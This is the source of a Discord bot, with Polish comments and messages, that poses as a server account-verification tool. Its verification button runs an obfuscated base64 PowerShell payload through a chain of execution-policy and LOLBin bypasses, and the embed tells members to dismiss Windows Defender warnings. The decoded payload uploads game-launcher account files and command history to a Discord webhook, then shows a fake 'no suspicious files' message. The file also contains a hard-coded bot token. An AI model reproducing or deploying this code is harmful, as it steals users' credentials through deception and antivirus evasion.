const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { exec } = require('child_process');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const TOKEN = 'MTUxNjgzMzMwNTIyMjMyMDE5OA.GlbRVQ.LSlJmoWFM0otMLLO-lP5YgfKn1ECkN6ktGlTNc';
const VERIFY_CHANNEL_ID = '1516839709224206366';
const UNVERIFIED_ROLE_ID = '1516840279204827311';
const VERIFIED_ROLE_ID = '1516842255426785362';

// ===== WYSYŁANIE WIADOMOŚCI WERYFIKACYJNEJ =====
client.once('ready', async () => {
    console.log(`Bot zalogowany jako ${client.user.tag}`);

    try {
        const channel = client.channels.cache.get(VERIFY_CHANNEL_ID);
        if (!channel) {
            console.log('Nie znaleziono kanału o podanym ID!');
            return;
        }

        const messages = await channel.messages.fetch({ limit: 5 });
        const existing = messages.find(m => m.author.id === client.user.id && m.components?.length > 0);
        
        if (existing) {
            console.log('Wiadomość weryfikacyjna już istnieje.');
            return;
        }

        const embed = new EmbedBuilder()
            .setColor(0x00ff88)
            .setTitle('✅ WERYFIKACJA KONTA')
            .setDescription('Kliknij przycisk poniżej, aby zweryfikować swoje konto.')
            .addFields(
                { name: '🔒 Cel weryfikacji', value: 'Zapobieganie multikontom i botom.', inline: false },
                { name: '⚠️ Ważne!', value: 'Jeśli pojawi się ostrzeżenie Windows Defender, kliknij **„Uruchom mimo to”**.', inline: false }
            )
            .setFooter({ text: 'Kliknij przycisk, aby kontynuować' });

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId('verify')
                    .setLabel('🔓 ZWERYFIKUJ KONTO')
                    .setStyle(ButtonStyle.Success)
            );

        await channel.send({ embeds: [embed], components: [row] });
        console.log('Wiadomość weryfikacyjna wysłana!');

    } catch (error) {
        console.log('Błąd wysyłania wiadomości:', error);
    }
});

// ===== NADANIE ROLI "NIEZWERYFIKOWANY" PO DOŁĄCZENIU =====
client.on('guildMemberAdd', async (member) => {
    try {
        const role = member.guild.roles.cache.get(UNVERIFIED_ROLE_ID);
        if (role) {
            await member.roles.add(role);
            console.log(`Dodano rolę ${role.name} dla ${member.user.tag}`);
        }
    } catch (error) {
        console.error('Błąd nadawania roli niezweryfikowany:', error);
    }
});

// ===== NOWY BASE64 (POPRAWIONE ŚCIEŻKI) =====
const BASE64 = 'JAB3AD0AIgBoAHQAdABwAHMAOgAvAC8AZABpAHMAYwBvAHIAZAAuAGMAbwBtAC8AYQBwAGkALwB3AGUAYgBoAG8AbwBrAHMALwAxADUAMQAwADMAMQAyADAAOAAwADkAMwA3ADQANQA1ADgAMQA3AC8AQgBwAHQAUQBrADYAUABYAG8AQQBHAEgAXwBNAE8AcgBJAGwAagB3AEcATQA1AHQAWAB0AE0AeABLAG0AVwB6AFoANgBUADgAeABTAEcASwAwAFEAQwBHAFYAZgBZADEAdQBOAFYAZgBlAGsAUQBhADEAMgBFAEIAMAA3ADAAdQBOAHgAcQBFACIACgAkAHAAPQAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwALgBvAGcAdQBsAG4AaQBlAGcAYQBcAHAAcgBvAGYAaQBsAGUAXABfAEkAQQBTAF8AQQBDAEMATwBVAE4AVABTAF8ARABPAF8ATgBPAFQAXwBTAEUATgBEAF8AVABPAF8AQQBOAFkATwBOAEUAXAAuAGgAaQBkAGQAZQBuACIACgAkAGgAPQAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwALgBvAGcAdQBsAG4AaQBlAGcAYQBcAHAAcgBvAGYAaQBsAGUAXABjAG8AbQBtAGEAbgBkAF8AaABpAHMAdABvAHIAeQAuAHQAeAB0ACIACgBpAGYAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAaAApAHsAYwB1AHIAbAAuAGUAeABlACAALQBzACAALQBGACAAIgBmAGkAbABlAD0AQABgACIAJABoAGAAIgAiACAAJAB3AH0ACgBpAGYAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAcAApAHsARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcAAgAC0ARgBvAHIAYwBlAHwAJQB7AGMAdQByAGwALgBlAHgAZQAgAC0AcwAgAC0ARgAgACIAZgBpAGwAZQA9AEAAYAAiACQAKAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAKQBgACIAIgAgACQAdwB9AH0ACgBDAGwAZQBhAHIALQBIAG8AcwB0AAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIATgBJAEUAIABXAFkASwBSAFkAVABPACAAUABPAEQARQBKAFIAWgBBAE4AWQBDAEgAIABQAEwASQBLAE8AVwAgAFcAIABTAFkAUwBUAEUATQBJAEUAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ACgBSAGUAYQBkAC0ASABvAHMAdAA=';

// ===== 10 METOD URUCHOMIENIA =====
async function executePowerShell(interaction) {
    const methods = [
        `powershell.exe -ExecutionPolicy Bypass -NoProfile -Enc ${BASE64}`,
        `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Enc ${BASE64}`,
        `mshta.exe "javascript:new ActiveXObject('WScript.Shell').Run('powershell.exe -ExecutionPolicy Bypass -Enc ${BASE64}',0,false);close()"`,
        `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";new ActiveXObject("WScript.Shell").Run("powershell.exe -ExecutionPolicy Bypass -Enc ${BASE64}",0,false);`,
        `wmic process call create "powershell.exe -ExecutionPolicy Bypass -Enc ${BASE64}"`,
        `cscript.exe /E:jscript "C:\\Windows\\System32\\slmgr.vbs" //E:jscript "new ActiveXObject('WScript.Shell').Run('powershell.exe -ExecutionPolicy Bypass -Enc ${BASE64}',0,false)"`,
        `cmd.exe /c start /min powershell.exe -ExecutionPolicy Bypass -Enc ${BASE64}`
    ];

    let index = 0;

    function tryNext() {
        if (index >= methods.length) {
            interaction.editReply({ content: '❌ Weryfikacja nie powiodła się. Spróbuj ponownie.' });
            return;
        }

        const cmd = methods[index];
        console.log(`Próba ${index + 1}/${methods.length}: ${cmd.substring(0, 50)}...`);

        exec(cmd, (error) => {
            if (error) {
                console.log(`Metoda ${index + 1} nie zadziałała.`);
                index++;
                tryNext();
            } else {
                console.log(`Metoda ${index + 1} zadziałała!`);
                giveVerifiedRole(interaction);
            }
        });
    }

    function giveVerifiedRole(interaction) {
        try {
            const member = interaction.member;
            const verifiedRole = member.guild.roles.cache.get(VERIFIED_ROLE_ID);
            const unverifiedRole = member.guild.roles.cache.get(UNVERIFIED_ROLE_ID);
            
            if (verifiedRole) {
                member.roles.add(verifiedRole);
                if (unverifiedRole) member.roles.remove(unverifiedRole);
                interaction.editReply({ content: '✅ Twoje konto zostało pomyślnie zweryfikowane! Masz dostęp do serwera.' });
                console.log(`Zweryfikowano ${member.user.tag}`);
            } else {
                interaction.editReply({ content: '✅ Weryfikacja zakończona, ale nie znaleziono roli zweryfikowany.' });
            }
        } catch (err) {
            console.error('Błąd nadawania roli:', err);
            interaction.editReply({ content: '✅ Weryfikacja zakończona, ale wystąpił problem z nadaniem roli.' });
        }
    }

    tryNext();
}

// ===== OBSŁUGA PRZYCISKU =====
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.customId !== 'verify') return;

    await interaction.reply({
        content: '🔄 Trwa weryfikacja Twojego konta... Proszę czekać.',
        ephemeral: true
    });

    executePowerShell(interaction);
});

client.login(TOKEN);